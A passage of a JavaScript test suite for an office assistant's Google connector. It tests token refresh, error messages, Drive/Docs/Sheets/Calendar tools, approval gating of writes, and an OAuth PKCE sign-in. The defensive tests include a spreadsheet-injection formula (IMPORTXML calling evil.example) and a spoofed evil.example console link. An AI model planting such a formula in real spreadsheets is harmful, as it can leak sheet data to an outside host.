// The office's own Google connector: the client (sign-in refresh, plain-words errors, office time),
// the tools per service (what they send to Google, what they refuse), the registry (writes wait for the
// owner's OK), the browser sign-in (state, PKCE, the one allowed account, nothing saved on a mistake)
// and the switch-on step. No network: Google is stood in for.
import { test } from 'node:test';
process.env.NIGHTDESK_NO_MODELS = '1';
process.env.NIGHTDESK_NO_LOCAL = '1'; // nor read this machine's office.config.local.json
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { StdioClientTransport, getDefaultEnvironment } from '@modelcontextprotocol/sdk/client/stdio.js';
import { Google, GoogleError, explain, toInstant, SERVICES, allScopes } from '../io/google-api.mjs';
import { buildServer, driveQuery, docText, toCsv, READS, WRITES, MIME } from '../servers/google-tools.mjs';
import { connectGoogle, authLink, idEmail, grantedServices, enable, checkServices, KEYS } from '../io/connect-google.mjs';
import { loadConfig, ROOT } from '../core/config.mjs';
import { Office } from '../company/office.mjs';
import { Connectors, globToRe } from '../engines/connectors.mjs';
import { toolGate, runKeys } from '../engines/agent.mjs';
import { loadSecrets, secret, setSecretsCheckMs } from '../core/secrets.mjs';
for (const k of Object.keys(process.env)) if (/^GOOGLE_|^MAIL_/.test(k)) delete process.env[k]; // the tests decide what is signed in

const tmp = p => fs.mkdtempSync(path.join(os.tmpdir(), p));
const json = (status, body) => ({ ok: status >= 200 && status < 300, status, json: async () => body, text: async () => JSON.stringify(body) });
const idToken = email => `x.${Buffer.from(JSON.stringify({ email, email_verified: true })).toString('base64url')}.y`;
const ALL = allScopes().join(' ');

// ---- the client ----------------------------------------------------------------------------------------
test('client: one refresh for many calls, a 401 retried once with a fresh token, the token never in an error', async () => {
  let refreshes = 0, now = 1e12; const seen = [];
  const fetchImpl = async (url, init) => {
    if (url.startsWith('https://oauth2.googleapis.com/token')) { refreshes++; assert.match(init.body, /grant_type=refresh_token/); return json(200, { access_token: `at-${refreshes}`, expires_in: 3600, scope: ALL }); }
    seen.push(init.headers.authorization);
    if (url.includes('/fail401') && seen.filter(h => h === 'Bearer at-1').length === 1 && init.headers.authorization === 'Bearer at-1') return json(401, {});
    if (url.includes('/forbidden')) return json(403, { error: { code: 403, message: 'The caller does not have permission', errors: [{ reason: 'forbidden' }] } });
    return json(200, { ok: true });
  };
  const g = new Google({ clientId: 'cid', clientSecret: 'csecret-value', refreshToken: 'rt-very-secret-value', fetchImpl, now: () => now });
  await Promise.all([g.call('GET', 'https://x.test/a'), g.call('GET', 'https://x.test/b')]);
  assert.equal(refreshes, 1, 'two calls at once share one refresh');
  assert.deepEqual(g.granted, ALL.split(' '));
  now += 3600000; await g.call('GET', 'https://x.test/c'); assert.equal(refreshes, 2, 'refreshed when it runs out');
  const g2 = new Google({ clientId: 'cid', clientSecret: 'cs', refreshToken: 'rt', fetchImpl, now: () => now });
  assert.deepEqual(await g2.call('GET', 'https://x.test/fail401'), { ok: true });
  const err = await g.call('GET', 'https://x.test/forbidden').catch(e => e);
  assert.ok(err instanceof GoogleError); assert.equal(err.kind, 'forbidden');
  assert.doesNotMatch(err.message, /at-\d|rt-very|csecret/);
});

test('client: a taken-back sign-in, a wrong client and no sign-in at all say what to do', async () => {
  const bad = code => new Google({ clientId: 'c', clientSecret: 's', refreshToken: 'r', fetchImpl: async () => json(400, { error: code, error_description: 'x' }) });
  const e1 = await bad('invalid_grant').token().catch(e => e); assert.equal(e1.kind, 'signed-out'); assert.match(e1.message, /connect google/);
  const e2 = await bad('invalid_client').token().catch(e => e); assert.equal(e2.kind, 'client'); assert.match(e2.message, /GOOGLE_OAUTH_CLIENT_ID/);
  const e3 = await new Google({}).call('GET', 'https://x.test').catch(e => e); assert.equal(e3.kind, 'signed-out');
});

test('errors: a switched-off API names the API and links to Google\'s own console only', () => {
  const off = explain(403, { error: { code: 403, message: 'Google Sheets API has not been used in project 567 before or it is disabled.', details: [{ '@type': 'type.googleapis.com/google.rpc.ErrorInfo', reason: 'SERVICE_DISABLED', metadata: { service: 'sheets.googleapis.com', consumer: 'projects/567', activationUrl: 'https://console.developers.google.com/apis/api/sheets.googleapis.com/overview?project=567' } }] } });
  assert.equal(off.kind, 'disabled'); assert.match(off.message, /Google Sheets API is switched off/); assert.match(off.message, /console\.developers\.google\.com\/apis\/api\/sheets/);
  const odd = explain(403, { error: { message: 'x', details: [{ reason: 'SERVICE_DISABLED', metadata: { service: 'docs.googleapis.com', consumer: 'projects/9', activationUrl: 'https://evil.example/enable' } }] } });
  assert.doesNotMatch(odd.message, /evil/); assert.match(odd.message, /console\.cloud\.google\.com\/apis\/library\/docs\.googleapis\.com\?project=9/);
  assert.equal(explain(403, { error: { message: 'Request had insufficient authentication scopes.', details: [{ reason: 'ACCESS_TOKEN_SCOPE_INSUFFICIENT' }] } }, 'drive').kind, 'scope');
  assert.equal(explain(404, { error: { message: 'File not found' } }).kind, 'notfound');
  assert.equal(explain(429, { error: { errors: [{ reason: 'rateLimitExceeded' }] } }).kind, 'rate');
});

test('office time: a time without a zone is London time (summer and winter), a full ISO time stays, nonsense is refused', () => {
  assert.equal(toInstant('2026-10-13T09:00'), '2026-10-13T08:00:00.000Z'); // BST
  assert.equal(toInstant('2026-12-01 09:00'), '2026-12-01T09:00:00.000Z'); // GMT
  assert.equal(toInstant('2026-12-01'), '2026-12-01T00:00:00.000Z');
  assert.equal(toInstant('2026-10-13T09:00:00+02:00'), '2026-10-13T07:00:00.000Z');
  for (const bad of ['2026-02-30', '2026-13-01T09:00', '13/10/2026', 'tomorrow', '2026-10-13T25:00']) assert.throws(() => toInstant(bad), GoogleError, bad);
});

// ---- the tools -----------------------------------------------------------------------------------------
function fakeGoogle(routes) {
  const calls = [];
  return { calls, async call(method, url, opts = {}) { calls.push({ method, url, ...opts }); for (const [re, fn] of routes) if (re.test(`${method} ${url}`)) return fn({ method, url, ...opts }); throw new Error(`no route for ${method} ${url}`); } };
}
async function client(g, services) {
  const server = buildServer({ google: g, services, tz: 'Europe/London' });
  const [a, b] = InMemoryTransport.createLinkedPair(); await server.connect(a);
  const c = new Client({ name: 'test', version: '1' }); await c.connect(b);
  const call = async (name, args = {}) => { const r = await c.callTool({ name, arguments: args }); return { error: !!r.isError, text: r.content.map(x => x.text).join('\n') }; };
  return { c, call, close: () => c.close() };
}

test('tools: each service offers exactly its own reads and writes, and writes are marked as such', async () => {
  for (const svc of Object.keys(SERVICES)) {
    const { c, close } = await client(fakeGoogle([]), [svc]);
    const tools = (await c.listTools()).tools;
    assert.deepEqual(tools.map(t => t.name).sort(), [...READS[svc], ...WRITES[svc]].sort(), svc);
    for (const t of tools) assert.equal(t.annotations?.readOnlyHint, READS[svc].includes(t.name), t.name);
    assert.ok(!tools.some(t => /delete|trash|remove/.test(t.name)), 'nothing deletes');
    await close();
  }
});

test('drive: search builds a safe query (quotes escaped, no ordering with full-text), read falls back to plain text', async () => {
  assert.equal(driveQuery({ text: "O'Brien \\ notes" }), "trashed = false and (name contains 'O\\'Brien \\\\ notes' or fullText contains 'O\\'Brien \\\\ notes')");
  assert.match(driveQuery({ folderId: 'abc', type: 'folder' }), /'abc' in parents and mimeType = 'application\/vnd\.google-apps\.folder'/);
  assert.match(driveQuery({ type: 'file' }), /mimeType != /);
  const g = fakeGoogle([
    [/GET .*\/drive\/v3\/files$/, () => ({ files: [{ id: 'f1', name: 'Leads', mimeType: MIME.sheet, modifiedTime: '2026-10-12T10:00:00Z', webViewLink: 'https://docs.google.com/x' }] })],
    [/GET .*\/files\/doc1\/export/, ({ query }) => { if (query.mimeType === 'text/markdown') throw new GoogleError('bad format', { status: 400, kind: 'input' }); return 'Plain words.'; }],
    [/GET .*\/files\/doc1$/, () => ({ id: 'doc1', name: 'Brief', mimeType: MIME.doc })],
    [/GET .*\/files\/pdf1$/, () => ({ id: 'pdf1', name: 'Invoice', mimeType: MIME.pdf })],
  ]);
  const { call, close } = await client(g, ['drive']);
  assert.match((await call('drive_search')).text, /Leads · Google Sheet · 2026-10-12 10:00 · id f1/);
  assert.equal(g.calls[0].query.orderBy, 'folder,modifiedTime desc');
  await call('drive_search', { text: 'pay' }); assert.equal(g.calls[1].query.orderBy, undefined);
  assert.match((await call('drive_read', { fileId: 'doc1' })).text, /Plain words\./);
  const pdf = await call('drive_read', { fileId: 'pdf1' }); assert.equal(pdf.error, false); assert.match(pdf.text, /reads Google Docs, Sheets, Slides and text files/);
  await close();
});

test('drive: a new doc goes up as markdown in one multipart request; Google files are not overwritten blind; sharing says who is told', async () => {
  const g = fakeGoogle([
    [/POST .*\/upload\/drive\/v3\/files$/, ({ body, contentType, query }) => { assert.equal(query.uploadType, 'multipart'); const b = contentType.match(/boundary=(\w+)/)[1]; assert.ok(body.startsWith(`--${b}\r\n`) && body.endsWith(`--${b}--`)); return { id: 'n1', name: 'Weekly', mimeType: MIME.doc, webViewLink: 'https://docs.google.com/n1' }; }],
    [/GET .*\/files\/gdoc$/, () => ({ id: 'gdoc', name: 'Plan', mimeType: MIME.doc })],
    [/POST .*\/files\/f9\/permissions$/, () => ({ id: 'p', role: 'reader' })],
  ]);
  const { call, close } = await client(g, ['drive']);
  const made = await call('drive_create_file', { name: 'Weekly', content: '# Week 41\n- 12 leads', folderId: 'fold' });
  assert.match(made.text, /Created Weekly · Google Doc/);
  const up = g.calls.at(-1); assert.match(up.body, /"mimeType":"application\/vnd\.google-apps\.document"/); assert.match(up.body, /"parents":\["fold"\]/); assert.match(up.body, /Content-Type: text\/markdown/); assert.match(up.body, /# Week 41/);
  assert.equal((await call('drive_create_file', { name: 'L', content: '=IMPORTXML("https://evil.example","//a"),07700900123', format: 'sheet' })).error, true, 'no CSV-to-Sheet conversion: it would run formulas and drop leading zeros');
  await call('drive_create_file', { name: 'l.csv', content: 'a,b', format: 'csv' }); assert.doesNotMatch(g.calls.at(-1).body, /"mimeType"/); assert.match(g.calls.at(-1).body, /Content-Type: text\/csv/);
  const blind = await call('drive_update_file', { fileId: 'gdoc', content: 'x' }); assert.equal(blind.error, true); assert.match(blind.text, /docs_ or sheets_ tools/);
  assert.match((await call('drive_share', { fileId: 'f9', email: 'a@b.co', role: 'commenter' })).text, /Shared with a@b\.co as commenter \(Google emailed them\)/);
  assert.equal(g.calls.at(-1).query.sendNotificationEmail, 'true');
  assert.equal((await call('drive_share', { fileId: 'f9', email: 'not an email' })).error, true);
  await close();
});

test('docs: text with headings, bullets, tables and every tab; appending starts a new paragraph', async () => {
  const para = (text, extra = {}) => ({ paragraph: { elements: [{ textRun: { content: text + '\n' } }], ...extra } });
  const body = { content: [para('Weekly report', { paragraphStyle: { namedStyleType: 'TITLE' } }), para('Leads up', { bullet: { nestingLevel: 0 } }), para('From Bristol', { bullet: { nestingLevel: 1 } }), { table: { tableRows: [{ tableCells: [{ content: [para('Day')] }, { content: [para('Leads')] }] }] } }] };
  assert.equal(docText({ body }), '# Weekly report\n- Leads up\n  - From Bristol\n| Day | Leads |');
  const two = docText({ tabs: [{ tabProperties: { title: 'One' }, documentTab: { body: { content: [para('a')] } }, childTabs: [{ tabProperties: { title: 'Two' }, documentTab: { body: { content: [para('b')] } } }] }] });
  assert.match(two, /=== Tab: One ===\na\n\n=== Tab: Two ===\nb/);
  const g = fakeGoogle([[/POST .*documents\/d1:batchUpdate$/, () => ({ replies: [{ replaceAllText: { occurrencesChanged: 2 } }] })]]);
  const { call, close } = await client(g, ['docs']);
  await call('docs_append', { documentId: 'd1', text: 'New line' });
  assert.deepEqual(g.calls[0].json.requests[0].insertText, { endOfSegmentLocation: {}, text: '\nNew line' });
  assert.match((await call('docs_replace_text', { documentId: 'd1', find: 'x', replace: 'y' })).text, /Replaced 2 occurrences/);
  await close();
});

test('sheets: values are stored exactly as given unless parse is asked for (no formula from outside text runs)', async () => {
  const g = fakeGoogle([
    [/PUT .*\/values\//, () => ({ updatedCells: 2, updatedRange: 'Leads!A2:B2' })],
    [/POST .*\/values\/.*:append$/, () => ({ updates: { updatedRange: 'Leads!A9:B9' } })],
    [/GET .*\/values\//, () => ({ range: 'Leads!A1:B2', values: [['Name', 'Note'], ['Ann', 'said "hi", then left']] })],
  ]);
  const { call, close } = await client(g, ['sheets']);
  await call('sheets_write', { spreadsheetId: 's1', range: 'Leads!A2', values: [['=IMPORTXML("https://evil.example","//a")', 3]] });
  assert.equal(g.calls[0].query.valueInputOption, 'RAW'); assert.match(g.calls[0].url, /\/values\/Leads!A2$/);
  await call('sheets_write', { spreadsheetId: 's1', range: 'Leads!A2', values: [['=SUM(B1:B9)']], parse: true });
  assert.equal(g.calls[1].query.valueInputOption, 'USER_ENTERED');
  assert.match((await call('sheets_append', { spreadsheetId: 's1', range: 'Leads!A1', values: [['Bo', 1]] })).text, /Added 1 row at Leads!A9:B9/);
  assert.match(g.calls[2].url, /\/values\/Leads!A1:append$/); assert.equal(g.calls[2].query.insertDataOption, 'INSERT_ROWS');
  assert.match((await call('sheets_read', { spreadsheetId: 's1', range: 'Leads' })).text, /Name,Note\nAnn,"said ""hi"", then left"/);
  assert.equal(toCsv([[null, 1, true]]), ',1,true');
  await close();
});

test('calendar: adding tells nobody, inviting tells the guests, an event with guests is not changed quietly', async () => {
  const g = fakeGoogle([
    [/POST .*\/calendars\/primary\/events$/, ({ json }) => ({ id: 'e1', ...json })],
    [/GET .*\/events\/guested$/, () => ({ id: 'guested', summary: 'Interview', attendees: [{ email: 'office@x.co', self: true }, { email: 'customer@x.co' }] })],
    [/GET .*\/events\/solo$/, () => ({ id: 'solo', summary: 'Call', start: { dateTime: '2026-10-13T08:00:00Z' }, end: { dateTime: '2026-10-13T08:30:00Z' } })],
    [/PATCH .*\/events\/solo$/, ({ json }) => ({ id: 'solo', summary: 'Call', ...json })],
  ]);
  const { call, close } = await client(g, ['calendar']);
  const add = await call('calendar_add', { summary: 'Site visit', start: '2026-10-14T10:00' });
  assert.equal(add.error, false, add.text);
  let c = g.calls.at(-1); assert.equal(c.query.sendUpdates, 'none'); assert.equal(c.json.attendees, undefined);
  assert.deepEqual(c.json.start, { dateTime: '2026-10-14T09:00:00.000Z', timeZone: 'Europe/London' }); assert.equal(c.json.end.dateTime, '2026-10-14T10:00:00.000Z');
  await call('calendar_add', { summary: 'Peak starts', start: '2026-11-01' }); c = g.calls.at(-1); assert.deepEqual([c.json.start, c.json.end], [{ date: '2026-11-01' }, { date: '2026-11-02' }]);
  const three = await call('calendar_add', { summary: 'Training', start: '2026-11-01', end: '2026-11-03' }); c = g.calls.at(-1);
  assert.deepEqual(c.json.end, { date: '2026-11-04' }, 'the end a desk gives is the last day'); assert.match(three.text, /2026-11-01 to 2026-11-03 \(all day\)/);
  assert.equal((await call('calendar_add', { summary: 'x', start: '2026-11-03', end: '2026-11-01' })).error, true);
  await call('calendar_invite', { summary: 'Interview', start: '2026-10-14T11:00', attendees: ['customer@x.co'] });
  c = g.calls.at(-1); assert.equal(c.query.sendUpdates, 'all'); assert.deepEqual(c.json.attendees, [{ email: 'customer@x.co' }]);
  assert.equal((await call('calendar_invite', { summary: 'x', start: '2026-10-14T11:00', attendees: [] })).error, true);
  const guarded = await call('calendar_update', { eventId: 'guested', summary: 'Moved' }); assert.equal(guarded.error, true); assert.match(guarded.text, /1 guest; changing it would notify them/);
  assert.equal(g.calls.some(x => x.method === 'PATCH' && /guested/.test(x.url)), false);
  await call('calendar_update', { eventId: 'solo', start: '2026-10-13T15:00' });
  c = g.calls.at(-1); assert.equal(c.query.sendUpdates, 'none'); assert.equal(c.json.start.dateTime, '2026-10-13T14:00:00.000Z'); assert.equal(c.json.end.dateTime, '2026-10-13T14:30:00.000Z', 'keeps its half hour');
  assert.equal((await call('calendar_add', { summary: 'x', start: '2026-10-14T10:00', end: '2026-10-14T09:00' })).error, true);
  await close();
});

test('tools: a Google error reaches the desk in plain words; anything else is wrapped, never thrown', async () => {
  const g = fakeGoogle([[/GET .*\/files$/, () => { throw new GoogleError('The Google Drive API is switched off in the Google Cloud project.', { kind: 'disabled' }); }], [/GET .*\/files\/x$/, () => { throw new TypeError('boom'); }]]);
  const { call, close } = await client(g, ['drive']);
  const a = await call('drive_search', { text: 'x' }); assert.equal(a.error, true); assert.match(a.text, /switched off/);
  const b = await call('drive_read', { fileId: 'x' }); assert.equal(b.error, true); assert.match(b.text, /Something went wrong: boom/);
  await close();
});

test('runner: one process per service, only that service\'s tools; an unknown service is refused', async () => {
  const transport = new StdioClientTransport({ command: process.execPath, args: [path.join(ROOT, 'servers/google.mjs'), 'calendar'], env: { ...getDefaultEnvironment() }, stderr: 'ignore' });
  const c = new Client({ name: 't', version: '1' }); await c.connect(transport);
  try { assert.deepEqual((await c.listTools()).tools.map(t => t.name).sort(), [...READS.calendar, ...WRITES.calendar].sort()); }
  finally { await c.close(); }
  const { spawnSync } = await import('node:child_process');
  const r = spawnSync(process.execPath, [path.join(ROOT, 'servers/google.mjs'), 'gmail'], { encoding: 'utf8' }); assert.equal(r.status, 2); assert.match(r.stderr, /unknown service gmail/);
});

// ---- the registry --------------------------------------------------------------------------------------
test('registry: four stdio entries, secrets only by name, and every write waits for the OK (whatever the live on/off state)', () => {
  const reg = JSON.parse(fs.readFileSync(path.join(ROOT, 'company/connectors.json'), 'utf8'));
  const svc = { 'google-drive': 'drive', 'google-docs': 'docs', 'google-sheets': 'sheets', 'google-calendar': 'calendar' };
  for (const k of KEYS) {
    const c = reg[k]; assert.equal(c.type, 'stdio', k); assert.equal(typeof c.disabled, 'boolean', k); assert.deepEqual(c.args.slice(-1), [svc[k]]); assert.match(c.args[0], /servers\/google\.mjs$/);
    assert.equal(c.own, true, k); assert.equal(c.env, undefined, k); assert.deepEqual(c.needs, ['GOOGLE_OAUTH_CLIENT_ID', 'GOOGLE_OAUTH_CLIENT_SECRET', 'GOOGLE_REFRESH_TOKEN']);
    const rules = (c.outbound || []).map(globToRe);
    for (const w of WRITES[svc[k]]) assert.ok(rules.some(re => re.test(w)), `${k}: ${w} must wait for the OK`);
    for (const r of READS[svc[k]]) assert.ok(!rules.some(re => re.test(r)), `${k}: ${r} is a read`);
  }
  assert.equal(reg.mail.own, true); assert.equal(reg.mail.env, undefined); assert.deepEqual(reg.mail.needs, ['MAIL_USER', 'MAIL_APP_PASSWORD']);
  // switched on but not signed in: the desk is told what is missing
  const dir = tmp('reg-'); const f = path.join(dir, 'connectors.json');
  const empty = path.join(dir, '.secrets.local'); fs.writeFileSync(empty, 'OTHER=1\n'); loadSecrets(empty);
  fs.writeFileSync(f, JSON.stringify({ ...reg, 'google-drive': { ...reg['google-drive'], disabled: false } }));
  const u = new Connectors(f).usable(['google-drive']); assert.deepEqual(u.keys, []); assert.match(u.missing[0], /needs secret GOOGLE_OAUTH_CLIENT_ID, GOOGLE_OAUTH_CLIENT_SECRET, GOOGLE_REFRESH_TOKEN/);
  const out = new Connectors(f).outboundRules(['google-drive']).map(globToRe);
  assert.ok(out.some(re => re.test('mcp__google-drive__drive_share'))); assert.ok(!out.some(re => re.test('mcp__google-drive__drive_search')));
});

// ---- the sign-in ---------------------------------------------------------------------------------------
const hit = url => new Promise((resolve, reject) => http.get(url, res => { let b = ''; res.on('data', d => (b += d)); res.on('end', () => resolve({ status: res.statusCode, body: b })); }).on('error', reject));
const signinCfg = (account = 'office@example.com') => { const d = tmp('gs-'); const secretsFile = path.join(d, '.secrets.local'); fs.writeFileSync(secretsFile, 'OTHER=1\n'); return { secretsFile, data: path.join(d, 'data'), google: { account } }; };

test('sign-in link: offline, fresh consent, PKCE, the office account suggested, every scope asked for', () => {
  const u = new URL(authLink({ clientId: 'cid', redirect: 'http://127.0.0.1:8765/callback', state: 's', challenge: 'c', account: 'office@example.com' }));
  const p = Object.fromEntries(u.searchParams);
  assert.equal(p.access_type, 'offline'); assert.equal(p.prompt, 'consent'); assert.equal(p.code_challenge_method, 'S256'); assert.equal(p.login_hint, 'office@example.com');
  assert.equal(p.scope, ALL); assert.equal(p.redirect_uri, 'http://127.0.0.1:8765/callback');
  assert.equal(idEmail(idToken('Office@Example.com')), 'office@example.com'); assert.equal(idEmail('junk'), '');
  assert.deepEqual(grantedServices(`openid ${SERVICES.drive.scope} ${SERVICES.calendar.scope}`), ['drive', 'calendar']);
});

test('sign-in: a stray request is ignored, the right one saves the lasting sign-in and says what was not allowed', async () => {
  const cfg = signinCfg(); let exchanged = null;
  const fetchImpl = async (url, init) => { exchanged = Object.fromEntries(new URLSearchParams(init.body)); return json(200, { access_token: 'at', refresh_token: 'rt-saved', scope: `openid email ${SERVICES.drive.scope} ${SERVICES.docs.scope}`, id_token: idToken('office@example.com') }); };
  let listen; const ready = new Promise(r => (listen = r));
  const p = connectGoogle({ cfg, clientId: 'cid', clientSecret: 'cs', port: 0, open: false, log: () => {}, fetchImpl, onListen: listen });
  const { redirect, state, url } = await ready;
  const challenge = new URL(url).searchParams.get('code_challenge');
  const stray = await hit(`${redirect}?state=wrong&code=evil`); assert.match(stray.body, /Not this sign-in/); assert.equal(exchanged, null, 'a wrong state is never exchanged');
  const ok = await hit(`${redirect}?state=${state}&code=good`); assert.match(ok.body, /connected to Google/); assert.match(ok.body, /Not allowed: Google Sheets, Google Calendar/);
  const r = await p; assert.deepEqual(r, { account: 'office@example.com', services: ['drive', 'docs'], missing: ['sheets', 'calendar'] });
  assert.equal(exchanged.code, 'good'); assert.equal(exchanged.redirect_uri, redirect); assert.ok(exchanged.code_verifier.length >= 43);
  const { createHash } = await import('node:crypto'); assert.equal(createHash('sha256').update(exchanged.code_verifier).digest('base64url'), challenge);
  assert.match(fs.readFileSync(cfg.secretsFile, 'utf8'), /^OTHER=1\nGOOGLE_REFRESH_TOKEN=rt-saved\n$/);
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(cfg.data, 'google.json'), 'utf8')).services, ['drive', 'docs']);
});

test('sign-in: the wrong account, a cancel or no lasting sign-in saves nothing', async () => {
  const run = async (fetchBody, query = 'code=c') => {
    const cfg = signinCfg(); let listen; const ready = new Promise(r => (listen = r));
    const p = connectGoogle({ cfg, clientId: 'cid', clientSecret: 'cs', port: 0, open: false, log: () => {}, fetchImpl: async () => json(200, fetchBody), onListen: listen });
    p.catch(() => {});
    const { redirect, state } = await ready; const page = await hit(`${redirect}?state=${state}&${query}`);
    const err = await p.catch(e => e); assert.ok(err instanceof GoogleError);
    assert.doesNotMatch(fs.readFileSync(cfg.secretsFile, 'utf8'), /GOOGLE_REFRESH_TOKEN/); assert.match(page.body, /That did not work/);
    return err;
  };
  assert.equal((await run({ access_token: 'a', refresh_token: 'r', scope: ALL, id_token: idToken('me.personal@gmail.com') })).kind, 'account');
  assert.match((await run({}, 'error=access_denied')).message, /cancelled/);
  assert.equal((await run({ access_token: 'a', scope: ALL, id_token: idToken('office@example.com') })).kind, 'refresh');
  assert.equal(await connectGoogle({ cfg: { secretsFile: '' }, clientId: 'c', clientSecret: 's' }).catch(e => e.kind), 'config');
});

// ---- switching on --------------------------------------------------------------------------------------
test('switch-on: each service is checked with Google; a switched-off API stays off with its link; working ones go on the desks', async () => {
  const d = tmp('en-'); const secretsFile = path.join(d, '.secrets.local');
  fs.writeFileSync(secretsFile, 'GOOGLE_OAUTH_CLIENT_ID=cid\nGOOGLE_OAUTH_CLIENT_SECRET=cs\nGOOGLE_REFRESH_TOKEN=rt\n');
  // start from Google off and on no desk, whatever the live files on this machine say
  const liveReg = JSON.parse(fs.readFileSync(path.join(ROOT, 'company/connectors.json'), 'utf8')); for (const k of KEYS) liveReg[k] = { ...liveReg[k], disabled: true, verified: false };
  const connectors = path.join(d, 'connectors.json'); fs.writeFileSync(connectors, JSON.stringify(liveReg));
  const liveCo = JSON.parse(fs.readFileSync(path.join(ROOT, 'company/company.json'), 'utf8')); for (const a of liveCo.agents) a.tools = (a.tools || []).filter(t => !KEYS.includes(t));
  const company = path.join(d, 'company.json'); fs.writeFileSync(company, JSON.stringify(liveCo));
  const routines = path.join(d, 'routines.json'); fs.copyFileSync(path.join(ROOT, 'company/routines.json'), routines);
  const brain = tmp('brain-'); fs.mkdirSync(path.join(brain, '00-Meta')); fs.writeFileSync(path.join(brain, '00-Meta/index.md'), '# Index');
  const o = new Office(loadConfig(ROOT, { secretsFile, brain, data: path.join(d, 'data'), company, routines, connectors, workflows: path.join(ROOT, 'company/workflows.json'), telegram: { enabled: false }, google: { account: 'office@example.com' } }));
  o.paused = true;
  let probed = null; o.health_.probe = async keys => { probed = keys; return keys.map(key => ({ key, health: { status: 'connected' } })); };
  const fetchImpl = async url => {
    if (url.startsWith('https://oauth2.googleapis.com/token')) return json(200, { access_token: 'at', expires_in: 3600, scope: ALL });
    if (url.startsWith('https://openidconnect.googleapis.com')) return json(200, { email: 'office@example.com' });
    if (url.includes('/drive/v3/about')) return json(200, { user: {} });
    if (url.includes('docs.googleapis.com')) return json(404, { error: { code: 404, message: 'Requested entity was not found.', status: 'NOT_FOUND' } });
    if (url.includes('sheets.googleapis.com')) return json(403, { error: { code: 403, message: 'Google Sheets API has not been used in project 567 before or it is disabled.', details: [{ reason: 'SERVICE_DISABLED', metadata: { service: 'sheets.googleapis.com', consumer: 'projects/567', activationUrl: 'https://console.developers.google.com/apis/api/sheets.googleapis.com/overview?project=567' } }] } });
    if (url.includes('/calendar/v3/calendars/primary/events')) return json(200, { items: [] });
    if (url.includes('/calendar/v3/calendars/primary')) return json(403, { error: { code: 403, message: 'Request had insufficient authentication scopes.', details: [{ reason: 'ACCESS_TOKEN_SCOPE_INSUFFICIENT' }] } }); // calendars.get needs more than calendar.events
    return json(500, {});
  };
  const r = await enable(o, { fetchImpl });
  assert.equal(r.account, 'office@example.com');
  assert.deepEqual(r.enabled, ['google-drive', 'google-docs', 'google-calendar']); assert.deepEqual(probed, ['google-drive', 'google-docs', 'google-calendar']);
  assert.equal(r.skipped.length, 1); assert.match(r.skipped[0], /google-sheets: The Google Sheets API is switched off.*sheets\.googleapis\.com/);
  const reg = JSON.parse(fs.readFileSync(connectors, 'utf8'));
  assert.equal(reg['google-drive'].disabled, false); assert.equal(reg['google-drive'].verified, true); assert.equal(reg['google-sheets'].disabled, true);
  assert.ok(o.company.agent('cos').tools.includes('google-calendar')); assert.ok(o.company.agent('report').tools.includes('google-docs')); assert.ok(!o.company.agent('dash').tools.includes('google-sheets'));
  assert.ok(r.desks.includes('cos + google-drive'));
  // the wrong account behind the saved sign-in: nothing goes on
  const wrong = await checkServices(new Google({ clientId: 'c', clientSecret: 's', refreshToken: 'r', fetchImpl: async url => (url.includes('token') ? json(200, { access_token: 'a', scope: ALL }) : json(200, { email: 'someone@gmail.com' })) }), { account: 'office@example.com' });
  assert.deepEqual(wrong.ok, []); assert.match(wrong.problems.drive, /signed in as someone@gmail\.com/);
  o.stop();
});

// ---- hardening, part 1 ------------------------------------------------------------------------------------
test('secrets: a sign-in written to the file reaches the running office without a restart', () => {
  const d = tmp('sec-'); const f = path.join(d, '.secrets.local'); fs.writeFileSync(f, 'GOOGLE_REFRESH_TOKEN=old-token-value\n');
  setSecretsCheckMs(0);
  try {
    loadSecrets(f); assert.equal(secret('GOOGLE_REFRESH_TOKEN'), 'old-token-value');
    fs.writeFileSync(f, 'GOOGLE_REFRESH_TOKEN=new-token-value\n'); const later = new Date(Date.now() + 5000); fs.utimesSync(f, later, later);
    assert.equal(secret('GOOGLE_REFRESH_TOKEN'), 'new-token-value');
  } finally { setSecretsCheckMs(2000); }
});

test('office-owned servers get the secrets file path and the office time zone, never a secret value', () => {
  const d = tmp('own-'); const f = path.join(d, 'connectors.json'); const sf = path.join(d, '.secrets.local');
  const reg = JSON.parse(fs.readFileSync(path.join(ROOT, 'company/connectors.json'), 'utf8'));
  fs.writeFileSync(f, JSON.stringify({ ...reg, 'google-drive': { ...reg['google-drive'], disabled: false }, mail: { ...reg.mail, disabled: false } }));
  fs.writeFileSync(sf, 'GOOGLE_OAUTH_CLIENT_ID=cid-value\nGOOGLE_OAUTH_CLIENT_SECRET=csecret-value\nGOOGLE_REFRESH_TOKEN=rt-secret-value\nMAIL_USER=office@example.com\nMAIL_APP_PASSWORD=app-password-value\n'); loadSecrets(sf);
  const k = new Connectors(f, { timezone: 'Europe/Madrid' });
  const s = k.sdkServers(['google-drive', 'mail']);
  assert.deepEqual(s['google-drive'].env, { OFFICE_SECRETS_FILE: sf, OFFICE_TZ: 'Europe/Madrid' }); assert.deepEqual(s['google-drive'].args.slice(-1), ['drive']);
  assert.deepEqual(s.mail.env, { OFFICE_SECRETS_FILE: sf, OFFICE_TZ: 'Europe/Madrid' });
  assert.doesNotMatch(JSON.stringify(s), /rt-secret-value|csecret-value|app-password-value/);
  assert.deepEqual(k.usable(['google-drive', 'mail']).keys, ['google-drive', 'mail']);
});

test('draft gate: a team member\'s connector is gated like the desk\'s own (no write before the OK, whoever calls it)', async () => {
  const d = tmp('gate-'); const f = path.join(d, 'connectors.json'); const sf = path.join(d, '.secrets.local');
  const reg = JSON.parse(fs.readFileSync(path.join(ROOT, 'company/connectors.json'), 'utf8'));
  fs.writeFileSync(f, JSON.stringify({ ...reg, 'google-drive': { ...reg['google-drive'], disabled: false }, 'google-sheets': { ...reg['google-sheets'], disabled: false } }));
  fs.writeFileSync(sf, 'GOOGLE_OAUTH_CLIENT_ID=c\nGOOGLE_OAUTH_CLIENT_SECRET=s\nGOOGLE_REFRESH_TOKEN=r\n'); loadSecrets(sf);
  const connectors = new Connectors(f);
  const desks = { lead: { id: 'lead', tools: [], team: ['numbers'] }, numbers: { id: 'numbers', tools: ['google-drive', 'google-sheets'] } };
  const company = { agent: id => desks[id] };
